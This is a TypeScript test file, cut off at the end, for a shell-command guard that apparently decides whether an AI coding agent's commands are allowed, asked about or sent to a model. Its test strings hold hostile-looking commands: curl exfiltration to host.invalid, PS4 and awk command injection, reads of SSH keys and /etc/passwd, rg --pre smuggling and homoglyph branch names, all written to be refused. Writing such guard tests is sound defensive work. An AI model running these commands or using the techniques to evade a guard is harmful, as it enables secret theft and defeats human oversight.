// Round 4, group D (the over-asking side): the decisions for findings 9, 10, 11, 12, 27, 28 and
// 29, and with every newly accepted form the nearest inputs that must still ask or go to the
// model. The allow corpus (test/allow-corpus.txt) holds the forms that must be a rule allow and
// work in the sandbox; this file holds the refusals. Run: node test/run.mjs test/d-fixes.test.mts.
//
// "ask" means the rules ask (`by: "rules"`); "classify" that the command is left to the model,
// which is off here; "allow" a rule allow that `sandboxBreaks` has nothing against; "breaks" a
// rule allow that then asks because it cannot work in the sandbox.
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import { DEFAULT_ASK, decideShell, expectedRepos, gitOnly, sandboxBreaks, SessionState, takeMoment, type Guard } from "../decide.ts";
// The session's moment is one per process, taken when decide.ts is loaded (round 4, B7-1). These
// tests make their files after that, so each SessionState here takes a moment of its own.
SessionState.moment = takeMoment;
import { canonical } from "../canon.ts";
import { compileRules } from "../rules.ts";
import { envKept, shellOwn } from "../sandbox.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

assert.ok(process.env.GIT_CONFIG_GLOBAL?.startsWith(os.homedir()), "run through test/run.mjs, which supplies a throwaway $HOME");
const base = fs.realpathSync(fs.mkdtempSync(path.join(os.homedir(), "d-fixes-")));
const repo = path.join(base, "repo");
const git = (dir: string, ...args: string[]) => execFileSync("git", ["-C", dir, ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
const write = (file: string, text: string, mode = 0o644) => {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text, { mode });
};

const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [path.resolve(import.meta.dirname, "..")],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: [],
  allowFeatureBranchPush: false,
};

before(() => {
  write(path.join(repo, "f"), "alpha one\nbeta two foo\n");
  write(path.join(repo, "g"), "one\n");
  write(path.join(repo, "a.ts"), "export const a = 1;\n");
  write(path.join(repo, "src", "a.ts"), "export const foo = 1;\n");
  write(path.join(repo, ".gitignore"), "node_modules/\nchild/\n");
  write(path.join(repo, "node_modules", ".bin", "tsc"), "#!/bin/sh\necho tsc\n", 0o755);
  write(path.join(repo, "node_modules", ".bin", "vitest"), "#!/bin/sh\necho vitest\n", 0o755);
  // A real package.json beside the stand-in files (second pass): npm reads it before it looks
  // in node_modules/.bin. Its own `bin` names another program.
  write(path.join(repo, "package.json"), `${JSON.stringify({ name: "fixture", version: "1.0.0", private: true, bin: { fixture: "cli.js" }, devDependencies: { typescript: "5.9.3" } }, null, 2)}\n`);
  fs.symlinkSync("/usr/bin/id", path.join(repo, "node_modules", ".bin", "outside"));
  write(path.join(repo, "node_modules", "pkg", "cli.js"), "#!/usr/bin/env node\n", 0o755);
  fs.symlinkSync("../pkg/cli.js", path.join(repo, "node_modules", ".bin", "linked"));
  git(base, "init", "-q", "-b", "main", repo);
  git(repo, "add", "-A");
  git(repo, "commit", "-qm", "init");
  git(base, "init", "-q", "-b", "main", path.join(repo, "child"));
  git(path.join(repo, "child"), "commit", "-q", "--allow-empty", "-m", "init");
});
after(() => fs.rmSync(base, { recursive: true, force: true }));

type Want = "allow" | "ask" | "classify" | "breaks";
async function outcome(command: string, g = guard, session = new SessionState(repo)): Promise<{ kind: Want | "deny"; reason: string }> {
  const d = await decideShell(g, session, repo, command);
  if (d.by === "no-model") return { kind: "classify", reason: d.reason };
  if (d.effect !== "allow") return { kind: d.effect === "ask" ? "ask" : "deny", reason: d.reason };
  const broken = d.printed === undefined ? "no printed text" : sandboxBreaks(d.printed, repo, session);
  return broken ? { kind: "breaks", reason: broken } : { kind: "allow", reason: "" };
}
const expect = (want: Want | Want[], commands: string[]) => {
  const wanted = [want].flat();
  for (const c of commands) test(`${wanted.join(" or ")}: ${JSON.stringify(c)}`, async () => {
    const got = await outcome(c);
    assert.ok(wanted.includes(got.kind as Want), `${JSON.stringify(c)} -> ${got.kind}: ${got.reason}`);
  });
};
// Not a rule allow that works: any of the three refusals.
const REFUSED: Want[] = ["ask", "classify", "breaks"];

describe("r4 11: a shell's name is tested where a program stands", () => {
  // Behind a program that only prints or searches for its words, a shell's name is a word.
  expect("allow", [
    "rg fish -c src",
    "echo zsh -c ls",
    "echo bash -- -x",
    "printf '%s\\n' bash -- -c",
    "grep zsh -c f",
    "egrep zsh -c f",
    "fgrep fish -c f",
    "/usr/bin/egrep zsh -c f",
    "/bin/fgrep fish -c f",
    "/usr/bin/echo zsh -c ls",
    "command echo fish -c ls",
    "time echo zsh -c ls",
    "env echo zsh -c ls",
    "bash -c 'echo zsh -c ls'",
    "echo bash -c -x ls",
    "echo bash -O extglob -c ls",
  ]);
  // Every shell that runs still asks, behind each wrapper the traversal knows and behind those
  // it does not.
  expect("ask", [
    "fish -c ls",
    "zsh -c ls",
    "env zsh -c ls",
    "sudo fish -c ls",
    "echo x | xargs zsh -c ls",
    "xargs zsh -c ls",
    "command zsh -c ls",
    "exec zsh -c ls",
    "time zsh -c ls",
    "nice zsh -c ls",
    "nohup fish -c ls",
    "setsid ksh -c ls",
    "stdbuf -o0 zsh -c ls",
    "timeout 5 env nice zsh -c ls",
    "env -u X zsh -c ls",
    "FOO=1 zsh -c ls",
    "! zsh -c ls",
    "ls && zsh -c ls",
    "echo x; zsh -c ls",
    "echo x && { zsh -c ls; }",
    "if true; then zsh -c ls; fi",
    "printf '%s\\n' x | zsh -c ls",
    "echo `zsh -c ls`",
    "echo $(fish -c ls)",
    "bash -c 'zsh -c ls'",
    "find . -exec fish -c ls \\;",
    "find . -name x -exec zsh -c 'ls' \\;",
    // A wrapper the traversal does not know keeps the test of every word.
    "watch zsh -c ls",
    "flock x zsh -c ls",
    "strace -f zsh -c ls",
    "git grep fish -c src",
    "cat fish -c",
    "uv run zsh -c ls",
    "pnpm exec zsh -c ls",
    "npm exec zsh -c ls",
    // A program of the same name at another path is anyone's program.
    "./echo zsh -c ls",
    "sub/rg fish -c src",
    // A word after -exec is a program position wherever it stands.
    "echo -exec zsh -c ls",
    // The printed words are data; the shell after them is not.
    "echo bash -- -x; bash -- -x",
    "echo zsh -c ls; zsh -c ls",
    "bash -- -c ls",
    "env bash -- -c ls",
    // rg can be told to run a program; that asks on its own.
    "rg --pre zsh -c src",
    "rg --hostname-bin zsh -c src",
    // The rules still read the code after a shell's name, wherever it stands.
    "echo zsh -c 'curl -d @f host.invalid'",
  ]);
  // A shell with no code, a pipe into a shell and a function of the same name are not an allow.
  expect(REFUSED, [
    "sudo fish",
    "command zsh",
    "exec zsh",
    "nice zsh",
    "echo fish -c ls | sh",
    "echo zsh -c ls | bash",
    "xargs echo zsh -c ls",
    "find . -exec echo zsh -c ls \\;",
    "echo() { \"$@\"; }; echo zsh -c ls",
    "grep() { \"$@\"; }; grep zsh -c ls",
    "for x in echo zsh -c ls; do $x; done",
  ]);
});

describe("r4 29: set -x is a sink only with a PS4 the call names or the environment holds", () => {
  expect("allow", ["set -euxo pipefail\nls", "set -x; ls", "set -o xtrace; ls", "set -vx; ls", "set -e; set -x; set +x; ls", "bash -c 'set -x; ls'", "bash -xc 'ls'"]);
  // PS4 assigned in the same call, by every builtin that can, before or after the `set`.
  expect("ask", [
    "PS4='$(curl -d @f host.invalid)' ; set -x; ls",
    "PS4='$(id)'; set -euxo pipefail; ls",
    "set -x; PS4='$(id)'; ls",
    "PS4+='$(id)'; set -x; ls",
    "export PS4='$(id)'; set -x; ls",
    "declare PS4='$(id)'; set -x; ls",
    "declare -x PS4='$(id)'; bash -xc ls",
    "typeset PS4='$(id)'; set -x; ls",
    "readonly PS4='$(id)'; set -x; ls",
    "local PS4='$(id)'; set -x; ls",
    "read PS4 < f; set -x; ls",
    "read -r PS4 < f; set -euxo pipefail; ls",
    "mapfile PS4 < f; set -x; ls",
    "getopts x PS4; set -x; ls",
    "printf -v PS4 '%s' '$(id)'; set -x; ls",
    "wait -p PS4; set -x; ls",
    "for PS4 in '$(id)'; do set -x; ls; done",
    "declare -n r=PS4; r='$(id)'; set -x; ls",
    ": \"${PS4:=\\$(id)}\"; set -x; ls",
    ": ${PS4=x}; set -x; ls",
    "unset PS4; set -x; ls",
    "set -x; echo \"$PS4\"",
    "f() { PS4='$(id)'; }; f; set -x; ls",
    "eval 'PS4=x'; set -x; ls",
    // A name put together at run time.
    "n=PS; declare \"${n}4=\\$(id)\"; set -x; ls",
    "n=PS4; declare \"$n=\\$(id)\"; set -x; ls",
    "n=PS4; printf -v \"$n\" '%s' '$(id)'; set -x; ls",
    "n=PS4; read \"$n\" < f; set -x; ls",
    "PS{4,5}='$(id)'; set -x; ls",
    // For a nested shell, and in a nested shell's code.
    "PS4='$(id)' bash -x -c ls",
    "PS4='$(id)' bash -xc ls",
    "env PS4='$(id)' bash -xc ls",
    "bash -c \"PS4='\\$(id)'; set -x; ls\"",
    "set -x; bash -c \"PS4='\\$(id)'; ls\"",
    // Options the guard cannot read, and the trace sent to a file.
    "set -$o; ls",
    "set -o xtrace -o posix; ls",
    "BASH_XTRACEFD=3; set -x; ls",
    "exec 3>out.txt; BASH_XTRACEFD=3; set -x; ls",
  ]);
  test("ask: set -x when the environment holds a PS4, which the shell inherits", async () => {
    const old = process.env.PS4;
    process.env.PS4 = "$(id)+ ";
    try {
      for (const c of ["set -euxo pipefail\nls", "set -o xtrace; ls"]) {
        const got = await outcome(c);
        assert.equal(got.kind, "ask", `${c} -> ${got.kind}`);
        assert.match(got.reason, /environment sets a PS4/);
      }
      assert.equal((await outcome("set -euo pipefail; ls")).kind, "allow");
    } finally {
      if (old === undefined) delete process.env.PS4;
      else process.env.PS4 = old;
    }
  });
});

describe("r4 9: the git-only grammar takes a newline after a null redirect, a glob after --, || true and a last pipe into head or tail", () => {
  expect("allow", [
    "git add -A 2>&1\n",
    "git add -A >/dev/null\ngit commit -m x",
    "git add -A 2>/dev/null\n\ngit commit -m x 2>&1\n",
    "git add -- *.ts",
    "git add -A -- *.ts",
    "git add -- ?.ts [ab].ts",
    "git add -- *.ts src/*.ts",
    "git add -- *",
    "git mv -- *.ts src",
    "git commit -m x || true",
    "git add -A && git commit -m x || true\n",
    "git commit -m x 2>&1 | tail -5",
    "git commit -m x | head",
    "git commit -m x | head -n 5",
    "git commit -m x | tail -n 5\n",
    "git commit -m x |\ntail -5",
    "git add -A && git status | head",
    "timeout 30 git commit -m x | tail -3",
  ]);
  // A redirect that is not to /dev/null, before the newline or anywhere.
  expect("breaks", ["git add -A > out.txt\ngit commit -m x", "git add -A 2> err.txt\n", "git add -A 2>&1 > out.txt\n", "git commit -m x | head > out.txt"]);
  expect("breaks", ["git add -A >dev/null\ngit commit -m x"]);
  // A glob before --, in an option's value, with a leading - or dot, with a /, as pathspec magic,
  // behind an option that takes a value, or in a subcommand that takes none.
  expect("breaks", [
    "git add *.ts",
    "git add *.ts -- a.ts",
    "git add --pathspec-from-file *.ts",
    "git add --pathspec-from-file -- *.ts",
    "git add --chmod -- *.ts",
    "git add a.ts -- *.ts",
    "git add -- -*.ts",
    "git add -- .g*",
    "git add -- .git*",
    "git add -- .*",
    "git add -- */config",
    "git add -- :*.ts",
    "git add -- :!*.ts",
    "git add -- ':(top)'*.ts",
    "git add -- '-'*.ts",
    "git add -- '.g'*",
    "git commit -m x -- *.ts",
  ]);
  expect(REFUSED, ["git checkout -- *.ts", "git reset -- *.ts"]);
  // `git rm` and `git restore` are refused by the rules, not by the git-only grammar (second
  // pass: a test that passed on any refusal could not tell): the grammar takes the glob after
  // `--` for each of the four subcommands and for no other, and `git restore --staged`, which
  // the rules allow, is a rule allow that works.
  test("the grammar takes a glob after -- for add, rm, mv and restore, and the rules still refuse rm and restore", async () => {
    for (const c of ["git add -- *.ts", "git rm -- *.ts", "git mv -- *.ts src", "git restore -- *.ts", "git restore -S -- *.ts", "git rm -q -- *.ts"]) assert.ok(gitOnly(c), c);
    for (const c of ["git rm *.ts", "git restore *.ts", "git checkout -- *.ts", "git reset -- *.ts", "git commit -- *.ts", "git stash -- *.ts"]) assert.ok(!gitOnly(c), c);
    const rm = await outcome("git rm -- *.ts");
    assert.equal(rm.kind, "classify", rm.reason);
    assert.match(rm.reason, /\(git rm\)/);
    const restore = await outcome("git restore -- *.ts");
    assert.equal(restore.kind, "ask", restore.reason);
    assert.match(restore.reason, /git restore discards local changes/);
    assert.equal((await outcome("git restore -S -- *.ts")).kind, "allow");
    assert.equal((await outcome("git restore -S *.ts")).kind, "breaks");
  });
  // `|| true` followed by more, before the end, or not `true` alone.
  expect("breaks", [
    "git commit -m x || true; ls",
    "git commit -m x || true\ngit add -A",
    "git commit -m x || true || true",
    "git commit -m x || ls",
    "git commit -m x || true x",
    "git commit -m x || /bin/true",
    "git commit -m x || :",
    "git commit -m x || git add -A",
    "true || git commit -m x",
    "git add -A || true\ngit commit -m x || true",
    "git add -A || true && git commit -m x",
    "git add -A && cd src || true",
  ]);
  expect(REFUSED, ["git commit -m x || true && git push", "git commit -m x || $t", "git commit -m x || true &"]);
  // A pipe into head or tail with anything but a count, into anything else, or in the middle.
  expect("breaks", [
    "git commit -m x | head -c 5",
    "git commit -m x | tail -f",
    "git commit -m x | tail -n +2",
    "git commit -m x | head -n -1",
    "git commit -m x | head -5 f",
    "git commit -m x | head f",
    "git commit -m x | head --lines=5",
    "git commit -m x | head -n5",
    "git commit -m x | head -q",
    "git commit -m x | head -n",
    "git commit -m x | head -n 3 -n 4",
    "git commit -m x | head -5 -5",
    "git commit -m x | head -５",
    "git commit -m x | head -n ٥",
    "git commit -m x | cat",
    "git commit -m x | tee out.txt",
    "git commit -m x | grep x",
    "git commit -m x | head | tail",
    "git add -A | head && git commit -m x",
    "git commit -m x | head; ls",
    "git commit -m x | head\ngit add -A",
    "git commit -m x | head -5 || true",
    "git commit -m x 2>&1 | tail -5 || true",
    "git commit -m x || true | head",
    "head | git commit -m x",
    "git commit -m x | /usr/bin/head -3",
    "git add -A && cd src | head",
  ]);
  expect(REFUSED, ["git commit -m x |& tail -5", "git commit -m x | head -$n", "git commit -m x | xargs head"]);
  // `./head` is a program of the project. What the decision says about it depends on where the
  // test's home is: under the temp directory (AUTOMODE_TEST_BASE below $TMPDIR, as one reviewer
  // ran it) the rules leave a program run from there to the model ("runs ./head"), anywhere else
  // they allow it and the sandbox check refuses. What must hold in both: it is no rule allow that
  // works, and the git-only grammar itself refuses the pipe.
  test("a pipe into ./head is refused wherever the test runs, and by the grammar itself", async () => {
    const got = await outcome("git commit -m x | ./head");
    assert.ok(got.kind === "breaks" || got.kind === "classify", `${got.kind}: ${got.reason}`);
    if (got.kind === "classify") assert.match(got.reason, /runs \.\/head/);
    assert.ok(!gitOnly("git commit -m x | ./head"));
    assert.match(sandboxBreaks("git commit -m x | ./head", repo, new SessionState(repo)) ?? "", /git commit writes inside \.git/);
  });
  // The printer has already dealt with these (the corpus holds the allowed spellings): a # that
  // starts no word is part of the word, and a newline inside quotes is part of the message.
  const printed = (c: string) => {
    const p = canonical(c);
    return "ask" in p ? undefined : p.text;
  };
  test("a # inside a word is text, and a quoted newline is part of a message", () => {
    assert.ok(gitOnly(printed("git commit -m 'a\nb'")!));
    assert.ok(gitOnly(printed("git add -A # stage\ngit commit -m x")!));
    assert.equal(printed("git add a#b"), "git add a'#'b");
    assert.ok(!gitOnly(printed("git commit -m 'a\n' | cat")!));
  });
  // Refused by another check as well, or with no git write to break: the git-only reading
  // itself, which is what grants a writable .git, says no.
  for (const c of [
    "cd src || true",
    "cd src | head",
    "git commit -m x || tru?",
    "git commit -m x | hea? -3",
    "git commit -m x || GIT_EDITOR=true true",
    "git commit -m x | GIT_EDITOR=true head",
    "git mv -k -- .g* src",
    "git status | cat",
    "git status || ls",
    "git status | head | head",
  ]) test(`not git-only: ${JSON.stringify(c)}`, () => assert.equal(gitOnly(printed(c) ?? "x"), false));
  for (const c of ["git status | head -3", "git status || true", "git commit -m x | \"head\" -3", "git commit -m x || 'true'"]) test(`git-only: ${JSON.stringify(c)}`, () => assert.equal(gitOnly(printed(c) ?? "x"), true));
  // Letters outside ASCII pass as the operands they are; they are never an option git knows.
  expect("allow", ["git add café.txt", "git add naïve/ café.txt", "git checkout -b fé"]);
  expect(REFUSED, ["git branch -D mаin", "git commit -m x ; git push origin mаin"]);
});

describe("r4 10: what an approved command creates is expected when it is written on lines", () => {
  const at = (...parts: string[]) => path.join(repo, ...parts);
  for (const [command, where] of [
    ["git clone --depth 1 https://github.com/o/r.git\n", ["r"]],
    ["git clone --depth 1 https://github.com/o/r.git 2>&1\n", ["r"]],
    ["git clone https://github.com/o/r.git\ngit clone https://github.com/o/s.git vendor/s\n", ["r", "vendor/s"]],
    ["mkdir x\ncd x\ngit init -q\n", ["x"]],
    ["\ngit init sub\n\n", ["sub"]],
    ["git init sub &&\ngit init other", ["sub", "other"]],
    ["git init \"wow!\"", ["wow!"]],
    // A newline inside quotes is part of the name it stands in.
    ["git init 'a\nb'", ["a\nb"]],
  ] as [string, string[]][]) {
    test(`expected at ${where.join(", ")}: ${JSON.stringify(command)}`, () => assert.deepEqual(expectedRepos(command, repo), where.map((w) => at(w))));
  }
  // What the reader cannot place still records nothing, so what appears pauses the session.
  for (const command of [
    "git clone https://github.com/o/r.git\ngit init $(pwd)/x",
    "git clone https://github.com/o/r.git # a comment\n",
    "git init *\n",
    "git init su?\n",
    "git clone https://github.com/o/r.git > log\n",
    "git clone https://github.com/o/r.git |\ncat",
    "git clone https://github.com/o/r.git &\n",
    "GIT_EDITOR=true git init sub\n",
    "git clone --separate-git-dir=../g https://github.com/o/r.git\n",
    "git init sub\nsub=x",
    "git init sub\n&& ls",
    "git status\nls\n",
  ]) test(`nothing is expected for ${JSON.stringify(command)}`, () => assert.equal(expectedRepos(command, repo), undefined));
});

describe("r4 27: read into plain names and node -v", () => {
  expect("allow", [
    "while read -r l; do echo \"$l\"; done < f",
    "read -r x < f; echo \"$x\"",
    "read x",
    "read",
    "read -r a b c < f",
    "if read -r first < f; then echo \"$first\"; fi",
    "cat f | while read -r line; do echo \"$line\"; done",
    "bash -c 'read -r x < f; echo \"$x\"'",
    "node -v",
    "node '-v'",
    "if node -v; then echo ok; fi",
    "node -v && npm -v",
  ]);
  // A name on the dangerous list, a subscript, a name from a variable.
  expect("ask", ["read -r PATH < f", "read PATH", "read -r IFS < f", "read -r GLOBIGNORE < f", "read -r BASH_ENV < f", "read -r histchars < f", "read -r \"$n\" < f", "read -r x[0] < f", "IFS= read -r line < f", "while IFS= read -r line; do echo \"$line\"; done < f"]);
  // What the read takes its input from: a credential file asks or stays with the model, on the
  // read itself and on the loop or group around it; a file named at run time stays with the model.
  expect("ask", ["read -r x < ~/.ssh/id_ed25519; echo \"$x\"", "node -v < ~/.ssh/id_ed25519"]);
  expect(REFUSED, [
    "while read -r l; do echo \"$l\"; done < ~/.ssh/id_ed25519",
    "while read -r l; do echo \"$l\"; done < .env",
    "{ read -r x; echo \"$x\"; } < ~/.ssh/id_ed25519",
    "exec < ~/.ssh/id_ed25519; read -r x; echo \"$x\"",
    "bash -c 'while read -r l; do echo \"$l\"; done < ~/.ssh/id_ed25519'",
    "while read -r l; do echo \"$l\"; done < \"$f\"",
    "while read -r l; do echo \"$l\"; done < $1",
    "read -r x <<< \"$y\"",
  ]);
  // Any option but -r, any name that is not plain lower case, any wrapper.
  expect("classify", [
    "read -a arr < f",
    "read -ra arr < f",
    "read -r -a arr < f",
    "read -p prompt x",
    "read -t 1 x",
    "read -n 1 x",
    "read -d x y < f",
    "read -u 3 x",
    "read -e x",
    "read -s x",
    "read -rs x",
    "read -r -- x < f",
    "read -r 'a b'",
    "read -r LINE < f",
    "read -r BASH_XTRACEFD < f",
    "read -r https_proxy < f",
    "read -r auto_resume < f",
    "./read -r x",
    "command read -r x",
    "env read -r x",
  ]);
  // What was read is a value nobody has seen: it is not a command, a script or a file to trust.
  expect(REFUSED, [
    "read -r x y < f; $x",
    "while read -r l; do $l; done < f",
    "while read -r l; do eval \"$l\"; done < f",
    "while read -r l; do bash -c \"$l\"; done < f",
    "while read -r l; do rm -rf \"$l\"; done < f",
    "while read -r l; do cat \"$l\"; done < f",
    "while read -r l; do curl \"https://example.invalid/$l\"; done < f",
    "while read -r l; do echo \"$l\"; done < f > opencode.json",
    "x=/etc; read -r x < f; cat \"$x/passwd\"",
    "for f in a b; do read -r f < g; cat \"$f\"; done",
  ]);
  test("classify: read into a name the environment already exports", async () => {
    process.env.d_fixes_exported = "1";
    try {
      assert.equal((await outcome("read -r d_fixes_exported < f")).kind, "classify");
      assert.equal((await outcome("read -r d_fixes_other < f")).kind, "allow");
    } finally {
      delete process.env.d_fixes_exported;
    }
  });
  expect("classify", ["node -e 'console.log(1)'", "node -p 1", "node --version x.js", "node -v --eval 'x'", "node -v x.js", "node -vp 1", "node -v; node -e 'x'", "./node -v", "/usr/bin/node -v", "env node -v", "timeout 5 node -v", "node \"-v x\""]);
  expect("ask", ["node -v > opencode.json", "NODE_OPTIONS=--require=./x.js node -v"]);
});

describe("r4 27: awk's > and | before any print, and a $ that expands nothing in a nested shell's code", () => {
  expect("allow", [
    "awk '$3 > max' f",
    "awk 'NR==1 || /foo/' f",
    "awk '{ if ($1 > max) max = $1 } END { print max }' f",
    "awk '$3>max{max=$3}END{print max}' f",
    "awk '/a|b/ { n++ } END { print n }' f",
    "awk '{ a = $1 > $2 ? 1 : 0; n += a } END { print n }' f",
    "awk -e '$2 > 3' -e '{ print $1 }' f",
  ]);
  expect("classify", [
    "awk '{ print > \"out\" }' f",
    "awk '{ print $1 > \"out\" }' f",
    "awk '{ print$1>\"out\" }' f",
    "awk '{ print | \"sh\" }' f",
    "awk '{ printf \"%s\\n\", $1 >> \"out\" }' f",
    "awk '{ printf(\"%s\", $0) > \"/dev/stderr\" }' f",
    "awk '{ \"date\" | getline d; print d }' f",
    "awk 'BEGIN { while ((\"ls\" | getline l) > 0) n++ }'",
    "awk '{ getline line < \"/etc/passwd\" }' f",
    "awk 'BEGIN { system(\"id\") }'",
    "awk '{ @f() }' f",
    // A > after a print earlier in the program: on the same line, behind a string that holds a
    // separator, on a later line, in a later -e.
    "awk '{ print \"a;b\" > \"f\" }' f",
    "awk '{ print \"}\" > \"f\" }' f",
    "awk '$1 > 2 { print } $2 > \"out\"' f",
    "awk '{ print $1 }\n$2 > \"x\" { n++ }' f",
    "awk -e '{ print $1 }' -e '$2 > \"x\"' f",
    // (Second pass.) A `>` the rules do not classify on their own, in a later source than the
    // print: it is refused only because the sources are judged as one program.
    "awk -e '{ print $1 }' -e '$2 > max' f",
    "awk --source '{ print $1 }' --source '$2 > max' f",
    "awk '{ print $1 } /a|b/' f",
    // The rules' own reading of a > before a string.
    "awk '$3 > \"abc\"' f",
  ]);
  expect("allow", ["bash -c 'grep \"foo$\" f'", "bash -c \"grep 'foo$' f\"", "bash -c 'sed -n \"/foo$/p\" f'", "bash -c 'bash -c \"grep \\\"foo$\\\" f\"'", "bash -c 'echo \"cost: 5$\"'"]);
  // A $ that does expand in the nested shell, and code an outer expansion writes.
  expect(REFUSED, [
    "bash -c 'grep \"$x\" f'",
    "bash -c 'grep \"foo$x\" f'",
    "bash -c 'grep `echo a` f'",
    "bash -c 'grep \"a$\" f; cat \"$f\"'",
    "sh -c 'cat \"$1\"' sh f",
    "find . -name x -exec sh -c 'grep \"a$\" \"$1\"' sh {} \\;",
    "bash -c \"grep '$x' f\"",
    "x=f; bash -c \"grep 'foo$' $x\"",
    "bash -c 'cat $HOME/.ssh/id_ed25519'",
  ]);
});

describe("r4 27: a variable the call plainly gives a literal is judged as that literal", () => {
  const judged = (c: string) => {
    const p = canonical(c);
    return "ask" in p ? `ask: ${p.ask}` : p.judged;
  };
  const text = (c: string) => {
    const p = canonical(c);
    return "ask" in p ? `ask: ${p.ask}` : p.text;
  };
  for (const [command, want] of [
    ["name=foo; grep -rn \"$name\" src", "name=foo ; grep -rn foo src"],
    ["a=one; b=uno; sed -i \"s/$a/$b/\" g", "a=one ; b=uno ; sed -i s/one/uno/ g"],
    ["name=foo; rg -n \"$name\" src", "name=foo ; rg -n foo src"],
    ["name=foo && grep -rn \"$name\" src", "name=foo && grep -rn foo src"],
    ["name=foo\ngrep -rn \"${name}\" src", "name=foo\ngrep -rn foo src"],
    ["name=foo; rg \"pre${name}post\" \"$name$name\"", "name=foo ; rg prefoopost foofoo"],
    ["name=foo; echo \"$(rg \"$name\" src)\"", "name=foo ; echo \"$(rg foo src)\""],
    ["d=src; ls \"$d\" && cat \"$d/a.ts\"", "d=src ; ls src && cat src/a.ts"],
    ["x=1; for i in \"$x\" 2; do echo \"$i\" \"$x\"; done", "x=1 ; for i in 1 2 ; do echo \"$i\" 1 ; done"],
  ] as [string, string][]) {
    test(`judged as written out: ${JSON.stringify(command)}`, () => {
      assert.equal(judged(command), want);
      // What runs keeps the expansion.
      assert.match(text(command), /\$/);
    });
  }
  // Everything else is judged with the expansion in it, as before.
  for (const command of [
    // Not quoted, not an argument, or not in this shell.
    "name=foo; grep -rn $name src",
    "name=foo; \"$name\" src",
    "name=foo; cat > \"$name\"",
    "name=foo; other=\"$name\"",
    "name=foo; case \"$name\" in foo) ls;; esac",
    "name=foo; [[ \"$name\" == foo ]] && ls",
    "name=foo; cat <<EOF\n$name\nEOF",
    "name=foo; bash -c 'rg \"$name\" src'",
    "name=foo; rg \"${name:-x}\" src",
    "name=foo; rg \"${#name}\" src",
    // Not assigned in the commands the call begins with, or not by a word of its own.
    "true && name=foo; rg \"$name\" src",
    "false || name=foo; rg \"$name\" src",
    "ls; name=foo; rg \"$name\" src",
    "if true; then name=foo; fi; rg \"$name\" src",
    "{ name=foo; }; rg \"$name\" src",
    "(name=foo); rg \"$name\" src",
    "name=foo | cat; rg \"$name\" src",
    "name=foo & rg \"$name\" src",
    "name=foo rg \"$name\" src",
    "name=foo > out; rg \"$name\" src",
    "! name=foo; rg \"$name\" src",
    "\"name=foo\"; rg \"$name\" src",
    "name=foo || true; rg \"$name\" src",
    // Named again, in any spelling.
    "name=foo; grep -rn \"$name\" src; name=bar",
    "name=foo; name=--pre=id; rg -n \"$name\" src",
    "name=foo; name+=bar; rg \"$name\" src",
    "name=foo; read -r name < f; rg \"$name\" src",
    "name=foo; while read -r name; do :; done < f; rg \"$name\" src",
    "name=foo; for name in a b; do rg \"$name\" src; done",
    "name=foo; unset name; rg \"$name\" src",
    "name=foo; export name; rg \"$name\" src",
    "name=foo; : \"${name:=bar}\"; rg \"$name\" src",
    "name=foo; env name=--pre=id true; rg \"$name\" src",
    "name=foo; rg \"$name\" src; : name=bar",
    "name=foo;rg \"$name\" src;{ name=bar; }",
    "name=foo; rg \"$name\" src; echo name",
    "na\\\nme=foo; rg \"$name\" src; na\\\nme=--pre=id",
    "name=foo; f() { name=--pre=id; }; f; rg \"$name\" src",
    "f() { rg \"$name\" src; }; name=foo; f",
    // Something that can set a variable without spelling its name.
    "name=foo; read -r \"$v\" < f; rg \"$name\" src",
    "name=foo; v=name; unset \"$v\"; rg \"$name\" src",
    "name=foo; declare \"$v=--pre=id\"; rg \"$name\" src",
    "name=foo; printf -v \"$v\" %s --pre=id; rg \"$name\" src",
    "name=foo; printf '%s\\n' x; rg \"$name\" src",
    "name=foo; eval \"$x\"; rg \"$name\" src",
    "name=foo; . ./x.sh; rg \"$name\" src",
    "name=foo; source ./x.sh; rg \"$name\" src",
    "name=foo; : $((name=5)); rg \"$name\" src",
    "name=foo; : $(($v=5)); rg \"$name\" src",
    "name=foo; (( name = 5 )); rg \"$name\" src",
    // A name or a value outside the plain ones.
    "Name=foo; rg \"$Name\" src",
    "PATH=x; rg \"$PATH\" src",
    "name=; rg \"$name\" src",
    "name=\"foo bar\"; rg \"$name\" src",
    "name='a*'; rg \"$name\" src",
    "name=f*; cat \"$name\"",
    "name=~; ls \"$name\"",
    "name=--pre=id; rg -n \"$name\" src",
    "name='--pre=id'; rg \"$name\" src",
    "name=-f; grep \"$name\" src/a.ts",
    "p=/etc/shadow; cat \"$p\"",
    "p=.env; cat \"$p\"",
    "b='uno/e;#'; a=one; sed -i \"s/$a/$b/\" g",
    "name=$(id); rg \"$name\" src",
    "name=\"$other\"; rg \"$name\" src",
    "name=foo; rg \"$names\" src",
  ]) {
    test(`judged as it stands: ${JSON.stringify(command)}`, () => {
      const p = canonical(command);
      if ("ask" in p) return;
      // Every expansion of the variable that is in what runs is in the judged text too.
      const name = /^\W*([A-Za-z_]\w*)\+?=/.exec(command)?.[1] ?? "name";
      const uses = (s: string) => (s.match(new RegExp(`\\$\\{?[#!]?${name}(?!\\w)`, "g")) ?? []).length;
      assert.equal(uses(p.judged), uses(p.text), p.judged);
    });
  }
  expect("allow", ["name=foo; grep -rn \"$name\" src", "name=foo; rg -n \"$name\" src", "name=foo && grep -rn \"$name\" src", "d=src; ls \"$d\" && cat \"$d/a.ts\""]);
  // The value is judged as written out: what it does is asked about as if typed.
  expect(REFUSED, [
    "a=one; b=uno/e; sed -i \"s/$a/$b/\" g",
    "a=one; b=uno; sed -i \"s/$a/$b/e\" g",
    "a=one; b=uno; sed -i \"s/$a/$b/w out\" g",
    "opt=delete; find . \"-$opt\"",
    "branch=main; git push origin \"$branch\"",
    "f=id_ed25519; cat ~/.ssh/\"$f\"",
    "x=opencode.json; cp f \"$x\"",
  ]);
  // A value the call does not show stays with the model or asks: a pattern may be an option
  // (`rg --pre=cmd`), a sed script may hold `e` or `w`.
  expect(REFUSED, [
    "grep -rn \"$name\" src",
    "rg -n \"$name\" src",
    "sed -i \"s/$a/$b/\" g",
